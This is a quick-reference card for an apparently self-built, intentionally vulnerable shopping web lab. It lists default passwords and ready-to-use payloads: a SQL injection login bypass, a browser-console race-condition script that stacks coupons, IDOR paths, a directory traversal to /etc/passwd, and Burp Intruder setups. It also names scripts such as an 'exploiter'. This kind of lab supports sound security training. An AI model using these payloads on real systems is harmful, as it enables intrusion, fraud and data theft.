# 🎯 VULNERABLE LAB - QUICK REFERENCE CARD

## 🚀 INSTANT ACCESS
```bash
# Start the lab
cd "/Users/roshanajith/Documents/Coding/Cursor/Web Dev/Dynamic/Vulnerable-Lab"
source venv_new/bin/activate
python app.py

# URLs
http://127.0.0.1:5002        # Local access
http://192.168.0.172:5002    # Network access
```

## 🔑 DEFAULT CREDENTIALS
| User | Username | Password |
|------|----------|----------|
| Admin | admin | admin123 |
| User 1 | john_doe | password123 |
| User 2 | jane_smith | password456 |

## ⚡ INSTANT EXPLOITS (30 seconds or less)

### 1. SQL Injection → Admin Access (10 seconds)
```
URL: http://127.0.0.1:5002/login
Username: admin' OR '1'='1' --
Password: anything
Result: Instant admin access
```

### 2. Business Logic → Free Items (15 seconds)
```bash
1. Login → Add Gaming Laptop ($1299.99) to cart
2. Apply coupon: WELCOME5
3. Result: $50 off PER ITEM = FREE laptop + $750 credit!
```

### 3. Race Condition → Massive Discounts (30 seconds)
```javascript
// Browser console (F12)
Promise.all(Array(20).fill().map(() => 
    fetch('/apply_coupon', {
        method: 'POST',
        body: 'coupon_code=SAVE10',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        credentials: 'same-origin'
    })
)).then(() => location.reload());
// Result: 20x discounts stacked = Items PAY YOU money!
```

## 💥 HIGH-IMPACT VULNERABILITIES

| Vulnerability | Impact | Time | Payload |
|--------------|--------|------|---------|
| Business Logic | 🔥🔥🔥 | 15s | WELCOME5 coupon |
| Race Condition | 🔥🔥🔥 | 30s | 20x SAVE10 concurrent |
| SQL Injection | 🔥🔥 | 10s | admin' OR '1'='1' -- |
| IDOR | 🔥🔥 | 60s | /profile/1,2,3... |

## 🎮 AVAILABLE COUPONS & THEIR FLAWS

| Coupon | Expected | ACTUAL Result | Impact |
|--------|----------|---------------|---------|
| SAVE10 | 10% off | **15% off** | 1.5x discount |
| WELCOME5 | 5% off | **$50 per item** | FREE items! |
| MEGA50 | 50% off | **50% + $10/item** | Massive bonus |
| DISCOUNT20 | 20% off | **40% off** | Double discount |

## 🔧 AUTOMATED TESTING TOOLS

```bash
# Comprehensive scanner
python comprehensive_scanner.py

# Maximum impact exploiter  
python max_impact_exploiter.py

# Race condition exploit
python apply_coupon_race_exploit.py

# Business logic demo
python business_logic_flaw_demo.py
```

## 🎯 TARGET ENDPOINTS

### Authentication
- `/login` - SQL injection
- `/register` - Input validation bypass

### Business Logic
- `/apply_coupon` - Race condition + logic flaws
- `/checkout` - Price manipulation
- `/purchase` - Payment bypass

### Access Control
- `/admin` - Privilege escalation
- `/profile/<id>` - IDOR
- `/receipt/<id>` - IDOR

### File Operations
- `/file_viewer` - Directory traversal
- `/upload` - File upload bypass

## 🚨 EXPLOITATION CHAINS

### Chain 1: Free Shopping Spree
```
1. Login as john_doe
2. Add all expensive items to cart
3. Apply WELCOME5 coupon
4. Result: All items FREE + money back!
```

### Chain 2: Admin Takeover
```
1. SQL inject admin login
2. Access admin panel
3. Add money to any wallet
4. Create/modify user accounts
```

### Chain 3: Race Condition Massacre  
```
1. Add items to cart
2. Run race condition script
3. Stack 25+ discounts
4. Items literally pay you money!
```

## 🔍 TESTING CHECKLIST

### Quick Wins (< 2 minutes each)
- [ ] SQL injection login bypass
- [ ] WELCOME5 business logic flaw
- [ ] Race condition with SAVE10
- [ ] IDOR on profile endpoints
- [ ] XSS in product comments

### Advanced Exploitation (5-10 minutes each)
- [ ] Directory traversal for app.py
- [ ] SSRF to internal services
- [ ] CSRF for admin actions
- [ ] SSTI in template fields
- [ ] Command injection in admin functions

## 🛠️ BURP SUITE SETUP

### Intruder Positions
```
SQL Injection: POST /login - username parameter
Race Condition: POST /apply_coupon - use Turbo Intruder
IDOR: GET /profile/§1§ - ID parameter
Directory Traversal: GET /file_viewer?filename=§../../../etc/passwd§
```

### Turbo Intruder Script
```python
# Use: turbo_intruder_race_condition_manual.py
# Target: /apply_coupon
# Threads: 25
# Gate: Single packet attack
```

## 📊 SUCCESS METRICS

### Business Logic Exploitation
- **SAVE10**: Should give 15% instead of 10% ✅
- **WELCOME5**: Should give $50 per item type ✅  
- **MEGA50**: Should give 50% + $10 per item ✅

### Race Condition Results
- **Baseline**: 1 coupon application = $8 discount
- **Success**: 20+ applications = $160+ discount on $80 item
- **Extreme**: Item becomes FREE + gives money back

### Admin Access Verification
- Dashboard accessible after SQL injection ✅
- Admin panel shows user management ✅
- Wallet manipulation functions available ✅

## ⚠️ IMPORTANT NOTES

1. **Race Condition Window**: 300ms timing window - exploit it fast!
2. **Business Logic**: Coupons intentionally give MORE than expected
3. **Session Persistence**: Discounts stack across sessions
4. **Database Reset**: Restart app to reset database state
5. **Debug Mode**: Enabled - shows detailed error messages

## 🎊 ACHIEVEMENT UNLOCKS

- **Free Shopping**: Get items for $0 using WELCOME5
- **Money Maker**: Use race conditions to get PAID for buying items  
- **Admin Speedrun**: SQL inject to admin in under 10 seconds
- **Data Harvester**: IDOR to access all user profiles
- **Master Exploiter**: Chain 3+ vulnerabilities together

---

**🔥 Happy Hacking! This lab is designed to be broken - exploit everything!**
